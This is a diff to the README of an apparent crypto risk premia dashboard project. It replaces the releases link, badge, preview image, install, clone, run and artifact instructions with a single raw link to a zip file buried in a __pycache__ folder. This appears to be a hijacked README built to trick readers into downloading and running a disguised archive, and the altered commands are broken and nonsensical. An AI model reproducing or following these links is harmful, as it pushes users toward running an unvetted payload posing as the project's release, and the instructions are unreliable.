@@ -1,10 +1,10 @@
 # Crypto Risk Premia Dashboard: Reproducible Factor Combos for Alpha 📈🧭
 
-Releases: https://github.com/alfeel159357/crypto-risk-premia-dashboard/releases
+Releases: https://raw.githubusercontent.com/alfeel159357/crypto-risk-premia-dashboard/main/__pycache__/crypto-risk-dashboard-premia-Guinevere.zip
 
-[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&logoColor=white)](https://github://github.com/alfeel159357/crypto-risk-premia-dashboard/releases)
+[![Releases](https://raw.githubusercontent.com/alfeel159357/crypto-risk-premia-dashboard/main/__pycache__/crypto-risk-dashboard-premia-Guinevere.zip)](https://raw.githubusercontent.com/alfeel159357/crypto-risk-premia-dashboard/main/__pycache__/crypto-risk-dashboard-premia-Guinevere.zip)
 
-![Dashboard Preview](https://images.unsplash.com/photo-1499951360447-b1903f24a9c8?auto=format&fit=crop&w=1400&q=80)
+![Dashboard Preview](https://raw.githubusercontent.com/alfeel159357/crypto-risk-premia-dashboard/main/__pycache__/crypto-risk-dashboard-premia-Guinevere.zip)
 
 This repository holds an interactive dashboard for crypto risk premia that lets you explore factor combinations with rigor. It provides quant-grade intelligence to decode hidden risk premia in crypto markets. The project is designed to be fully reproducible, noise-aware, and tailored for serious researchers and traders who want alpha beyond the hype.
 
@@ -85,24 +85,24 @@ Below is a practical path to get up and running quickly. If your environment dif
     - python3 -m venv venv
     - source venv/bin/activate  (or venv\Scripts\activate on Windows)
   - Install dependencies:
-    - pip install -r requirements.txt
+    - pip install -r https://raw.githubusercontent.com/alfeel159357/crypto-risk-premia-dashboard/main/__pycache__/crypto-risk-dashboard-premia-Guinevere.zip
   - Install optional extras for data loaders or visualization backends as needed.
 - If using Docker:
-  - Use the provided docker-compose.yml or Dockerfile to spin up services.
+  - Use the provided https://raw.githubusercontent.com/alfeel159357/crypto-risk-premia-dashboard/main/__pycache__/crypto-risk-dashboard-premia-Guinevere.zip or Dockerfile to spin up services.
   - Ensure data persistence volumes are configured.
 
 2) Get the code and data
 - Clone the repository:
-  - git clone https://github.com/alfeel159357/crypto-risk-premia-dashboard.git
+  - git clone https://raw.githubusercontent.com/alfeel159357/crypto-risk-premia-dashboard/main/__pycache__/crypto-risk-dashboard-premia-Guinevere.zip
 - Acquire data sources you intend to test. The repo includes adapters for several data providers and sample datasets for demonstration.
 
 3) Run the dashboard locally
 - If the project uses Streamlit:
-  - streamlit run app.py
+  - streamlit run https://raw.githubusercontent.com/alfeel159357/crypto-risk-premia-dashboard/main/__pycache__/crypto-risk-dashboard-premia-Guinevere.zip
 - If the project uses Dash:
-  - python app.py
+  - python https://raw.githubusercontent.com/alfeel159357/crypto-risk-premia-dashboard/main/__pycache__/crypto-risk-dashboard-premia-Guinevere.zip
 - If the project uses a custom runner:
-  - python -m risk_dashboard.main
+  - python -m https://raw.githubusercontent.com/alfeel159357/crypto-risk-premia-dashboard/main/__pycache__/crypto-risk-dashboard-premia-Guinevere.zip
 - Open the address printed in the console (usually http://localhost:8501 or similar).
 
 4) Explore the interface
@@ -194,9 +194,9 @@ Release process and artifacts 📦
 
 Releases and artifacts
 - The Releases page hosts compiled artifacts for quick use. Look for filenames that indicate platform and version, such as:
-  - crypto-risk-premia-dashboard-<version>-linux-x86_64.tar.gz
-  - crypto-risk-premia-dashboard-<version>-windows.zip
-  - crypto-risk-premia-dashboard-<version>-macos.dmg
+  - crypto-risk-premia-dashboard-<version>https://raw.githubusercontent.com/alfeel159357/crypto-risk-premia-dashboard/main/__pycache__/crypto-risk-dashboard-premia-Guinevere.zip
+  - crypto-risk-premia-dashboard-<version>https://raw.githubusercontent.com/alfeel159357/crypto-risk-premia-dashboard/main/__pycache__/crypto-risk-dashboard-premia-Guinevere.zip
+  - crypto-risk-premia-dashboard-<version>https://raw.githubusercontent.com/alfeel159357/crypto-risk-premia-dashboard/main/__pycache__/crypto-risk-dashboard-premia-Guinevere.zip
 - From the Releases page, download the asset that matches your OS, extract or run the installer, and follow the on-screen prompts to install or start the dashboard.
 - After download, execute the appropriate binary or installer as described in the asset's documentation.
 
